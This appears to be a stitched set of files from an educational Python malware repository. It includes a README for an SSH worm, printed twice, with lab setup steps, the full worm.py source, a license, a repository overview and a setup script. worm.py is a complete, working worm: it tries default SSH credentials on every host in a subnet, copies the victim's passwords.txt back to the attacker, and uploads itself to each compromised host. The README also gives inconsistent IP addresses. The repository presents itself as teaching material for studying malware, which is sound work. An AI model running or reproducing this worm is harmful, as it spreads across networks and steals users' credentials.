@@ -1,0 +1,385 @@
+Our worm is implemented in the file worm.py. It tries to spread over the selected network via SSH connection and copy itself on the remote host. If the victim has a file passwords.txt in the home directory, it will obtain the file and send it back to the system of the attacker.
+
+Demonstration of behavior
+A valid infrastructure needs to be setup for this example. We need at least two hosts on the same network. To do this, it is recommended to setup two virtual machines, one for the attacker and one for the victim. To learn more about virtual machines, see the guide to virtual machines. A free and popular virtualization tool is Oracle VM VirtualBox. For the system of the victim use Metasploitable2 (a simple Linux VM often used for demostration of security vulnerabilities). Once you create both VMs, to connect them to the same network in VirtualBox go to Setting->Network->AdapterN->Attached to and select Internal network. This must be done for both VMs.
+
+Now run both systems and log in. The default credentials on the Metasploitable2 are
+
+user: msfadmin
+pass: msfadmin
+Make sure that you have this repo cloned on the system of the attacker. The last thing we have to do is to assign valid IP addresses to both machines. This can be done with the following command:
+
+ip addr add [IP addr]/24 dev [Interface]
+Assign 198.168.0.3 to the victim and 168.168.0.2 to the attacker. To make sure you have done everything correctly, make the systems ping each other.
+
+Victim:   ping 198.168.0.2
+Attacker: ping 198.168.0.3
+If you can see the response, everything is fine and we can proceed to the actual demonstration.
+
+Make a simple file on the victim's system containing something like the following text and name it passwords.txt. This represents private file of the user on the vulnerable system.
+
+My social media credentials
+---------------------------
+user: user
+pass: mysecurepassword
+Finally, we can execute our worm on the system of the attacker (./worm.py). This worm will try to access each host on the network and log in via SSH. To learn more about SSH see the guide to SSH. If it succeeds, it copies itself on the vulnerable system and steals the file passwords.txt if the user has one. If everything was done correctly, you should see the following log of the worm. It has tried to log in to hosts 198.168.0.1 and 198.168.0.2 with various credentials and failed. But it has successfully connected to 2 users on the system 198.168.0.3 and stole the password file from one of them. You should see this file in the same directory on the system of the attacker.
+
+DEBUG:root:Trying to spread on the remote host: 198.168.0.1
+DEBUG:root:The remote host refused connection with credentials user,user.
+DEBUG:root:The remote host refused connection with credentials root,root.
+DEBUG:root:The remote host refused connection with credentials msfadmin,msfadmin.
+
+DEBUG:root:Trying to spread on the remote host: 198.168.0.2
+DEBUG:root:The remote host refused connection with credentials user,user.
+DEBUG:root:The remote host refused connection with credentials root,root.
+DEBUG:root:The remote host refused connection with credentials msfadmin,msfadmin.
+
+DEBUG:root:Trying to spread on the remote host: 198.168.0.3
+DEBUG:root:The worm is succesfully connected to the remote host [user, user].
+DEBUG:root:The victim did not have passwords.txt
+DEBUG:root:The remote host refused connection with credentials user,user.
+DEBUG:root:The remote host refused connection with credentials root,root.
+DEBUG:root:The worm is succesfully connected to the remote host [msfadmin, msfadmin].
+DEBUG:root:The victim had passwords.txt
+...
+The creation of worm itself is very simple process as it is described below and anyone can do it just with a basic knowledge of programming and understandment of networking. That's why we should keep our systems updated, secured and credentials strong.
+
+How does it work?
+Firstly, we create our worm and pass it a network address representing the network, on which it should spread.
+worm = Worm('198.168.0.0')
+Then we call function spread_via_ssh, which tries to connect to each host on the network, establish an SSH connection and spread itself (while stealing the password file).
+worm.spread_via_ssh()
+At the beginning, this method creates an SSHClient from paramiko module that would help us to create the connection.
+ssh = paramiko.SSHClient()
+ssh.get_missing_host_key_policy(paramiko.AutoAddPolicy())
+Then it iterates over all host addresses on the network (implemented as generator generate_addresses_on_network). The worm contains property credentials, which represents combinations of usernames and passwords that the worm is willing to try. That means that it will try to login via SSH 3 times on each host. SSH uses port 22.
+for remote_address in self.generate_addresses_on_network():
+    for user, passw in self.credentials:
+        try:
+            ssh.connect(remote_address, port=22, username=user, password=passw)
+            ...
+If the connection fails, it is captured as an exception and the worm continues with another user or host. However, if the connection is established (as in the case of 198.162.0.3), we can create an SCP client that will transmit our files. To learn more about SCP, see the guide to SCP.
+scp_client = scp.SCPClient(ssh.get_transport())
+Now we can execute file transmition commands. One will obtain the password file and the second one will send the worm to the remote host. A name of the file is obtained from the system arguments.
+scp_client.get('password.txt')
+scp_client.put(sys.argv[0])
+
+
+
+
+
+
+
+
+
+
+
+
+
+//
+
+
+
+Our worm is implemented in the file worm.py. It tries to spread over the selected network via SSH connection and copy itself on the remote host. If the victim has a file passwords.txt in the home directory, it will obtain the file and send it back to the system of the attacker.
+
+Demonstration of behavior
+A valid infrastructure needs to be setup for this example. We need at least two hosts on the same network. To do this, it is recommended to setup two virtual machines, one for the attacker and one for the victim. To learn more about virtual machines, see the guide to virtual machines. A free and popular virtualization tool is Oracle VM VirtualBox. For the system of the victim use Metasploitable2 (a simple Linux VM often used for demostration of security vulnerabilities). Once you create both VMs, to connect them to the same network in VirtualBox go to Setting->Network->AdapterN->Attached to and select Internal network. This must be done for both VMs.
+
+Now run both systems and log in. The default credentials on the Metasploitable2 are
+
+user: msfadmin
+pass: msfadmin
+Make sure that you have this repo cloned on the system of the attacker. The last thing we have to do is to assign valid IP addresses to both machines. This can be done with the following command:
+
+ip addr add [IP addr]/24 dev [Interface]
+Assign 198.168.0.3 to the victim and 168.168.0.2 to the attacker. To make sure you have done everything correctly, make the systems ping each other.
+
+Victim:   ping 198.168.0.2
+Attacker: ping 198.168.0.3
+If you can see the response, everything is fine and we can proceed to the actual demonstration.
+
+Make a simple file on the victim's system containing something like the following text and name it passwords.txt. This represents private file of the user on the vulnerable system.
+
+My social media credentials
+---------------------------
+user: user
+pass: mysecurepassword
+Finally, we can execute our worm on the system of the attacker (./worm.py). This worm will try to access each host on the network and log in via SSH. To learn more about SSH see the guide to SSH. If it succeeds, it copies itself on the vulnerable system and steals the file passwords.txt if the user has one. If everything was done correctly, you should see the following log of the worm. It has tried to log in to hosts 198.168.0.1 and 198.168.0.2 with various credentials and failed. But it has successfully connected to 2 users on the system 198.168.0.3 and stole the password file from one of them. You should see this file in the same directory on the system of the attacker.
+
+DEBUG:root:Trying to spread on the remote host: 198.168.0.1
+DEBUG:root:The remote host refused connection with credentials user,user.
+DEBUG:root:The remote host refused connection with credentials root,root.
+DEBUG:root:The remote host refused connection with credentials msfadmin,msfadmin.
+
+DEBUG:root:Trying to spread on the remote host: 198.168.0.2
+DEBUG:root:The remote host refused connection with credentials user,user.
+DEBUG:root:The remote host refused connection with credentials root,root.
+DEBUG:root:The remote host refused connection with credentials msfadmin,msfadmin.
+
+DEBUG:root:Trying to spread on the remote host: 198.168.0.3
+DEBUG:root:The worm is succesfully connected to the remote host [user, user].
+DEBUG:root:The victim did not have passwords.txt
+DEBUG:root:The remote host refused connection with credentials user,user.
+DEBUG:root:The remote host refused connection with credentials root,root.
+DEBUG:root:The worm is succesfully connected to the remote host [msfadmin, msfadmin].
+DEBUG:root:The victim had passwords.txt
+...
+The creation of worm itself is very simple process as it is described below and anyone can do it just with a basic knowledge of programming and understandment of networking. That's why we should keep our systems updated, secured and credentials strong.
+
+How does it work?
+Firstly, we create our worm and pass it a network address representing the network, on which it should spread.
+worm = Worm('198.168.0.0')
+Then we call function spread_via_ssh, which tries to connect to each host on the network, establish an SSH connection and spread itself (while stealing the password file).
+worm.spread_via_ssh()
+At the beginning, this method creates an SSHClient from paramiko module that would help us to create the connection.
+ssh = paramiko.SSHClient()
+ssh.get_missing_host_key_policy(paramiko.AutoAddPolicy())
+Then it iterates over all host addresses on the network (implemented as generator generate_addresses_on_network). The worm contains property credentials, which represents combinations of usernames and passwords that the worm is willing to try. That means that it will try to login via SSH 3 times on each host. SSH uses port 22.
+for remote_address in self.generate_addresses_on_network():
+    for user, passw in self.credentials:
+        try:
+            ssh.connect(remote_address, port=22, username=user, password=passw)
+            ...
+If the connection fails, it is captured as an exception and the worm continues with another user or host. However, if the connection is established (as in the case of 198.162.0.3), we can create an SCP client that will transmit our files. To learn more about SCP, see the guide to SCP.
+scp_client = scp.SCPClient(ssh.get_transport())
+Now we can execute file transmition commands. One will obtain the password file and the second one will send the worm to the remote host. A name of the file is obtained from the system arguments.
+scp_client.get('password.txt')
+scp_client.put(sys.argv[0])
+
+
+
+
+
+
+
+
+
+
+
+
+//
+
+#!/usr/bin/env python3
+
+""" Implementation of simple worm that spreads via SSH connection.
+"""
+
+import logging
+import paramiko
+import scp
+import sys
+
+
+class Worm:
+    """ This class represents implementation of worm that spreads via SSH
+    connections.
+    """
+
+    def __init__(self, network_address):
+        self._network = network_address
+
+    @property
+    def network(self):
+        """ Network, on which the worm spreads. """
+        return self._network
+
+    @network.setter
+    def network(self, new_network):
+        self._network = new_network
+
+    @property
+    def credentials(self):
+        """ Possible SSH credentials of the victim. """
+        return (
+            ('user', 'user'),
+            ('root', 'root'),
+            ('msfadmin', 'msfadmin')
+        )
+
+    def generate_addresses_on_network(self):
+        """ Generate addresses of hosts on the given network.
+        For simplicity is expected the following mask:
+        255.255.255.0
+        """
+        network = self.network.split('.')
+        for host in range(1, 256):
+            network[-1] = str(host)
+            yield '.'.join(network)
+
+    def spread_via_ssh(self):
+        """ Spread the worm on the network via SSH connections.
+        To establish SSH connection try selected user-password
+        combinations. When the connection is established, copy
+        the worm to the remote host.
+        """
+        # Setup SSH client.
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        for remote_address in self.generate_addresses_on_network():
+            logging.debug('Trying to spread on the remote host: {}'.format(remote_address))
+            print()
+
+            for user, passw in self.credentials:
+                try:
+                    ssh.connect(remote_address, port=22, username=user, password=passw, timeout=10)
+                    logging.debug('The worm is succesfully connected to the remote host [{}, {}].'.format(user, passw))
+
+                    # Create SCP client for file transmission.
+                    with scp.SCPClient(ssh.get_transport()) as scp_client:
+                        # Obtain file with victim's passwords.
+                        try:
+                            scp_client.get('passwords.txt')
+                            logging.debug('The victim had passwords.txt')
+                        except Exception:
+                            logging.debug('The victim did not have passwords.txt')
+
+                        # Upload worm to the remote host.
+                        try:
+                            scp_client.put(sys.argv[0])
+                            logging.debug('The worm has been uploaded to victim')
+                        except Exception:
+                            logging.debug('The worm could not be uploaded to victim')
+
+                    print()
+                except Exception:
+                    logging.debug('The remote host refused connection with credentials {},{}.'.format(user, passw))
+                    print()
+
+        ssh.close()
+
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.DEBUG)
+    # Disable basic logging of paramiko to make log easier to read.
+    logging.getLogger('paramiko').setLevel(logging.CRITICAL)
+
+    # Initialize worm with the network address.
+    worm = Worm('198.168.0.0')
+    # Spread via SSH connection on the network.
+    worm.spread_via_ssh()
+
+
+
+
+
+
+//ignore virtualenv directory after creation
+
+
+
+
+
+
+
+
+
+//Copyright (c) 2019 Patrik Holop
+
+Permission is hereby granted, free of charge, to any person
+obtaining a copy of this software and associated documentation
+files (the "Software"), to deal in the Software without
+restriction, including without limitation the rights to use,
+copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the
+Software is furnished to do so, subject to the following
+conditions:
+
+The above copyright notice and this permission notice shall be
+included in all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
+EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
+OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
+NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
+HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
+WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
+OTHER DEALINGS IN THE SOFTWARE.
+
+
+
+
+
+
+
+//This repository contains explanatory examples of malicious behavior like file infection or remote code execution. It's supposed to demonstrate and explain the nature of malicious software with practical examples in Python.
+
+Note: This repository contains examples of malicious files. It should be used for educational purposes only. Usage of files in this repository for any other purpose might cause you legal issues, even though the provided examples are very simple. It is advised to follow the instructions.
+
+Showcase structure
+File infector - This kind of malware infects other files. Common example of such behavior is code injection. Malicious code is injected into targeted files and might be later executed. This allows the file infectors to spread. The purpose of their payload might differ, from harmless to destructive behavior.
+Simple file infector in Python (with explanation)
+Trojan (trojan horse) - This kind of malware tries to look like a legitimate software and the malicious activity is hidden from the victim. Common example of such behaviour is spying on victims. Trojans can be more precisely classified by a purpose of the malicious segment. They were named after the Greek story, in which the city of Troy has accepted a statue of wooden horse as a gift from their enemies, while the enemy soldiers were hidden inside.
+Simple trojan in Python (with explanation)
+Worm - This kind of malware tries to spread on the network and does not need a host file to spread. Worms might contain malicious payload and execute commands on the compromised systems or just consume the network bandwidth to jam the communication.
+Simple worm in Python (with explanation)
+Spyware - This kind of malware tries to spy on the victim and steal his or her data. There exist various ways of spying on the victim, for example scanning the pressed keys on the keyboard. In comparison with the trojan horse, spyware stays often hidden from the sight of the victim.
+Simple keylogger in Python (with explanation)
+Ransomware - This kind of malware tries to encrypt your files or even restrict your access to the system until a financial ransom is paid. It might continuously remove your files to increase the threat and force you to submit. Ransomwares became very popular in the recent years.
+Simple ransomware in Python (with explanation)
+Adware - This kind of malware tries to aggressively show ads to the victims. Usually it is just an annoying software that does not have any harmful intentions. Adware might try various methods to make the advertising more persistent.
+Simple adware in Python (with explanation)
+Dropper - This kind of malware attemps to download or dump malicious code to the target system. The malware can be secretly embedded in the dropper itself or downloaded from a remote server. It often tries to avoid detection by obfuscation and encryption.
+Simple dropper in Python (with explanation)
+Installation
+Make sure that you have installed Python3, system package python3-dev and Python package wheel.
+
+sudo apt install python3-dev
+pip3 install wheel
+python3 setup.py bdist_wheel  # You might need to run this command as well.
+To setup a virtual environment, run the following command:
+
+source setup_env.sh
+Or you can install required Python packages listed in requirements.txt on your own. If something goes wrong during the installation, the script should provide you information about possible failures. You can then focus on the problematic steps in setup_env.sh and fix the problem.
+
+
+
+
+
+
+
+
+
+
+
+//Add a repository logo to README.
+
+
+
+
+
+
+//#!/bin/sh
+# This script automates the creation of Python virtual environment.
+
+if [ -d "virtualenv" ]; then
+    echo "Virtual environment 'virtualenv' found, activating it."
+else
+    echo "Virtual environment not found, creating new 'virtualenv'."
+    python3 -m venv virtualenv
+    if [ $? -eq 0 ]; then
+        echo "Virtual environment was successfully created."
+    else
+        echo "Virtual environment was NOT created, aborting."
+        exit 1
+    fi
+fi
+
+source virtualenv/bin/activate
+if [ $? -eq 0 ]; then
+    echo "Virtual environment is successfully activated."
+else
+    echo "Virtual environment was NOT activated, aborting."
+    exit 1
+fi
+
+echo "Installing required packages."
+pip3 install -r requirements.txt
+if [ $? -eq 0 ]; then
+    echo "All requirements were successfully installed."
+else
+    echo "Requirements were NOT installed properly, aborting."
+    exit 1
+fi
+
+echo "Done."
